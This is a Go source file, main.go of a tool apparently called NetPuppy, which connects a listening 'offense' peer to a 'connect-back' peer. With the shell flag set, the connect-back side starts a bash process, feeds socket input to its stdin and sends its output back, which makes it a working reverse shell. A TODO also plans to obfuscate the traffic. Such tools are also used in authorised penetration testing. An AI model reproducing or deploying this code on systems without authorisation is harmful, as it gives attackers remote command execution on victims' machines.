package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"os"
	"os/signal"
	"time"

	// NetPuppy modules:
	"netpuppy/utils"
)

func readFromUserShell(shellUserChannel chan<- string, stdout *io.ReadCloser, stderr *io.ReadCloser) {
	/*
		Depending on if the shell process is true on the peer struct,
		we have 3 go routines: 2 for if the shell is true (readStdout, readStderr)
		and one if it's false (readUserInput)

		The go routines put data they get from their sources into the channel.
		Think of the user and the shell as being treated the same by the peer...
	*/

	// Read data being outputed by the shell process (shell stdout):
	readForStdout := func(stdout *io.ReadCloser, shellUserChannel chan<- string) {
		// For loop checks for data in shell stdout:
		for {
			outData, err := io.ReadAll(*stdout) // Dereference the stdout pointer to get the actual value @ the address in memory
			if err != nil {
				fmt.Printf("Error reading data from stdout pipe: %v\n", err)
				os.Stderr.WriteString(err.Error() + "\n")
				os.Exit(1)
			}
			// If data: change to string & put into channel:
			cData := string(outData)
			shellUserChannel <- cData
		}
		// Wait? (may need Cmd.Wait() here)
	}

	// Read ERROR data being outputed by the shell process (stderr):
	readForStderr := func(stderr *io.ReadCloser, shellUserChannel chan<- string) string {
		// For loop checks for data in shell stderr:
		for {
			errData, err := io.ReadAll(*stderr) // Dereference the stderr pointer to get the actual value @ the address in memory
			if err != nil {
				fmt.Printf("Error reading data from stderr pipe: %v\n", err)
				os.Stderr.WriteString(err.Error() + "\n")
				os.Exit(1)
			}
			// If data: change to string and put in channel:
			cData := fmt.Sprintf("%c", errData)
			shellUserChannel <- cData
		}
		// Wait? (may need Cmd.Wait() here)
	}

	// If there's no shell (or we're the offense peer), get data from the user instead:
	readForUSerInput := func(reader *bufio.Reader, shellUserChannel chan<- string) {
		// For loop checks for input from user:
		for {
			fmt.Print(">> ")
			text, _ := reader.ReadString('\n')
			fmt.Printf("user input before channel: %v\n", text)

			// If there is input, put into channel:
			if len(text) > 0 {
				shellUserChannel <- text
			}
		}
	}

	// If the stdout param is not nil, that means we have a shell process AND we're the connect-back peer:
	if stdout != nil {
		// Start separate go routines for capturing data from the shell:
		go readForStderr(stderr, shellUserChannel)
		go readForStdout(stdout, shellUserChannel)

	} else { // if shellProcess is nil, then just start go routine for getting user input:
		var reader *bufio.Reader = bufio.NewReader(os.Stdin)
		go readForUSerInput(reader, shellUserChannel)
	}
}

func readFromSocket(socketChannel chan<- []byte, connection utils.Socket) {
	/*
		The socketChannel is for gathering & channeling data
		COMING IN from the socket to this peer. NP is reading the socket
		here and putting the data in that channel.
	*/

	// Read from connection socket:
	for {
		dataBytes, err := connection.Read()
		if err != nil {
			fmt.Printf("Error reading from socket: %v\n", err)
			os.Stderr.WriteString(err.Error())
			os.Exit(1)
			return
		}

		// If data is not empty:
		if len(dataBytes) > 0 {
			fmt.Printf("data before putting in socket channel: %v\n", dataBytes)
			socketChannel <- dataBytes
		}
	}
}

func runApp(c utils.ConnectionGetter) {
	// Parse flags from user, attach to struct:
	flagStruct := utils.GetFlags()

	// Print banner:
	fmt.Printf("%s", utils.Banner())

	// Create peer instance based on user input:
	var socket utils.Socket
	// POINTER: thisPeer is a pointer to the actual instance of Peer returned by CreatePeer:
	var thisPeer *utils.Peer = utils.CreatePeer(flagStruct.Port, flagStruct.Host, flagStruct.Listen, flagStruct.Shell)

	// Update user:
	var updateUserBanner string = utils.UserSelectionBanner(thisPeer.ConnectionType, thisPeer.Address, thisPeer.RPort, thisPeer.LPort)
	fmt.Println(updateUserBanner)

	// Make connection:
	if thisPeer.ConnectionType == "offense" {
		socket = c.GetConnectionFromListener(thisPeer.LPort, thisPeer.Address)
	} else {
		socket = c.GetConnectionFromClient(thisPeer.RPort, thisPeer.Address)
	}

	fmt.Printf("Address of socket in main.go: %v\n", socket)

	// Connect socket connection to peer
	thisPeer.Connection = socket

	var shell utils.BashShell
	// If shell flag is true, start shell:
	if thisPeer.Shell && thisPeer.ConnectionType == "connect-back" {
		var realShellGetter utils.RealShellGetter
		fmt.Printf("This peer shell: %v\n", thisPeer.Shell)

		shell = realShellGetter.GetConnectBackInitiatedShell()
		fmt.Printf("Address of shell in main.go: %v\n", shell)

		// Connect shell to peer:
		thisPeer.ShellProcess = shell
	}

	// Update banner w/ missing port:
	// var missingPortInBanner = utils.PrintMissingPortToBanner(thisPeer.ConnectionType, thisPeer.Connection)
	// fmt.Println(missingPortInBanner)

	// Start SIGINT go routine & start channel to listen for SIGINT:
	listenForSIGINT(thisPeer)

	var stdin *io.WriteCloser
	var stdout *io.ReadCloser
	var stderr *io.ReadCloser

	socketChannel := make(chan []byte)
	shellUserChannel := make(chan string)

	// If this peer is connect-back & has a shell: get pipes for shell & start the shell process:
	if thisPeer.Shell && thisPeer.ConnectionType == "connect-back" {
		// Hook up the pipes & return pointers to them:
		stdout = thisPeer.ShellProcess.PipeStdout()
		stdin = thisPeer.ShellProcess.PipeStdin()
		stderr = thisPeer.ShellProcess.PipeStderr()

		// Start shell:
		erR := thisPeer.ShellProcess.StartShell()
		if erR != nil {
			log.Fatalf("Error starting shell process: %v\n", erR)
		}

		// Start go routine to handle stdin & stdout:
		readFromUserShell(shellUserChannel, stdout, stderr)

	} else {
		// If this peer does not need a shell, start go routine to read user input:
		readFromUserShell(shellUserChannel, nil, nil)
	}

	// Start go routine for reading from socket:
	go readFromSocket(socketChannel, thisPeer.Connection)

	/*
			This for loop is where all the hacking magic happens.
			We use select statements to check if either channel has
			data in it.

			1) shellUserChannel: will have EITHER data from the user (input)
				or data from the shell process (stdout/stderr)
			2) socketChannel: will have data coming inbound through the socket

			If either has data in it, we do things to it and move on. If no data,
			there is a small timeout as default.


		TO DO":::::
			- send the entire commaand (or capture the entire command)
			- decode
			- fix output on target (obfuscate over the wire)
				- mitm....
				- ssh server/client in go std lib ( or non standard protocol)
			- io reader loop


	*/
	for {
		select {
		// Read shellUserChannel and write the data to the socket:
		case socketOutgoing := <-shellUserChannel:
			// NEED TO: fix encoding/ decoding
			if len(socketOutgoing) > 3 {

				//converted := fmt.Sprintf("%c", socketOutgoing)
				fmt.Println("ioReader: ", socketOutgoing)
				_, err := thisPeer.Connection.Write([]byte(socketOutgoing))

				if err != nil {
					// Quit here?
					fmt.Printf("Error in userInput select: %v\n", err)
					os.Stderr.WriteString(" " + err.Error() + "\n")
				} else {
					continue
				}
			}
			//socketBoundInput = ""
		// Read socketChannel & print to user OR redirect to shell process stdin:
		case ProgramsHoleToBePluggedAndReceiveALoadIPromiseIAmDoneNow := <-socketChannel: // @c0dec0re 'socketIncoming'
			// NEED TO: fix encoding/ decoding
			fmt.Printf("socketChannel value: %v\n", ProgramsHoleToBePluggedAndReceiveALoadIPromiseIAmDoneNow)

			// Convert bytes to string:
			ThisisReallyLongAndReadersAreGreatButHavingOneWriterMakesSense := string(ProgramsHoleToBePluggedAndReceiveALoadIPromiseIAmDoneNow) // @c0decore 'sendString'

			// If we have a cb shell & we're connect-back peer, data received from socket should be sent to shell stdin:
			if thisPeer.ConnectionType == "connect-back" && thisPeer.Shell {
				// Convert byte array to string:
				converted := fmt.Sprintf("%s", string(ThisisReallyLongAndReadersAreGreatButHavingOneWriterMakesSense))

				// Write socket data to stdin:
				fmt.Printf("converted: %v\n", converted)

				// io.WriteString wants to defer the closer so we dereference stdin:
				var dereferenceForCloseMethod io.WriteCloser = *stdin
				go func() {
					// Write channel data to shell stdin:
					defer dereferenceForCloseMethod.Close()
					_, err := io.WriteString(dereferenceForCloseMethod, ThisisReallyLongAndReadersAreGreatButHavingOneWriterMakesSense)
					if err != nil {
						log.Fatalf("Error writing socket data to shell stdin (main.go): %v\n", err)
					}
				}()

			} else {
				// Print data from socket channel to user:
				_, err := os.Stdout.Write(ProgramsHoleToBePluggedAndReceiveALoadIPromiseIAmDoneNow)
				if err != nil {
					// Quit here?
					fmt.Printf("Error in writing to stdout (main.go): %v\n", err)
					os.Stderr.WriteString(" " + err.Error() + "\n")
				}
			}
		default:
			time.Sleep(300 * time.Millisecond)
		}
	}
}

func listenForSIGINT(thisPeer *utils.Peer) { // POINTER: passing Peer by reference (we ACTUALLY want to close it)
	// If SIGINT: close connection, exit w/ code 2
	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt)

	go func() {
		for sig := range signalChan {
			if sig.String() == "interrupt" {
				fmt.Printf("signal: %v\n", sig)
				thisPeer.Connection.Close()
				os.Exit(2)
			}
		}
	}()
}

func main() {
	// In order to test the connection code w/o creating REAL sockets, runApp() handles most of the logic:
	var realConnection utils.RealConnectionGetter
	runApp(realConnection)
}
